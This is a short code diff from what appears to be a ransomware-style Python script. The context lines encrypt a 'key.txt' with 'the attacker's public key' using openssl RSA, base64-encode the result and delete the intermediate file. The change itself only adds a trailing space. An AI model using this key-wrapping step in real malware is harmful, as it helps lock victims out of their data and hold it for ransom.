@@ -40,7 +40,7 @@ def main():
 
     # 4) Encrypt key.txt with the attacker's public key (RSA encryption)
     # encrypt key.txt to binary, then binary to text
-    run_cmd("openssl rsautl -encrypt -pubin -inkey public.pem -in key.txt -out key_cipher.bin")
+    run_cmd("openssl rsautl -encrypt -pubin -inkey public.pem -in key.txt -out key_cipher.bin ")
     run_cmd("openssl base64 -in key_cipher.bin -out key_cipher.txt")
     # remove intermediate binary
     os.remove("key_cipher.bin")
